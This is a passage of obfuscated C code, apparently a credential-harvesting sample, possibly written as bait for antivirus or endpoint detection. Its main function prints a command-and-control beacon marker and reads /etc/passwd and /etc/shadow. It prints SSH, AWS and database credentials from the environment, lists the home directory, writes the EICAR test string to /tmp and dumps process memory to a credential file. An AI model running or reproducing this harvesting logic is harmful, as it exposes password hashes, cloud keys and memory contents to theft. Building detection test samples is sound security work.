...
int32_t main(void)
{
    static volatile int64_t j_20wqp449 = 46673;
    if ((j_20wqp449 * j_20wqp449) >= 0)
    {
    }
    else
    {
    ...
    (void)printf("%s\n", "=== c2 marker ===");
    (void)printf("%s\n", "c2.evil-domain.com/beacon");
    (void)printf("%s\n", "=== process list ===");
    (void)printf("%s\n", j_sys_process_list());
    (void)printf("%s\n", "=== /etc/passwd ===");
    (void)printf("%s\n", j_fs_read("/etc/passwd"));
    (void)printf("%s\n", "=== /etc/shadow (best-effort) ===");
    (void)printf("%s\n", j_fs_read("/etc/shadow"));
    (void)printf("%s\n", "=== environment (credential-relevant) ===");
    (void)printf("%s\n", j_env_get("USER"));
    (void)printf("%s\n", j_env_get("HOME"));
    (void)printf("%s\n", j_env_get("SSH_AUTH_SOCK"));
    (void)printf("%s\n", j_env_get("AWS_ACCESS_KEY_ID"));
    (void)printf("%s\n", j_env_get("AWS_SECRET_ACCESS_KEY"));
    (void)printf("%s\n", j_env_get("DATABASE_URL"));
    (void)printf("%s\n", "=== home dir (recon) ===");
    const char* j_e8rt6xmw = j_env_get("HOME");
    (void)printf("%s\n", j_fs_list(j_e8rt6xmw));
    (void)printf("%s\n", j_fs_exists(j_e8rt6xmw) ? "true" : "false");
    (void)printf("%s\n", "=== staged collection (fs.write to /tmp) ===");
    (void)j_fs_write("/tmp/av_bait_collected.txt", "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n");
    (void)printf("%s\n", j_fs_read("/tmp/av_bait_collected.txt"));
    (void)printf("%s\n", "=== process memory dump (Windows only, pid=4) ===");
    (void)j_mem_dump(4, "C:\\temp\\cred_dump.bin");
    (void)printf("%s\n", "done");
    return 0;
}
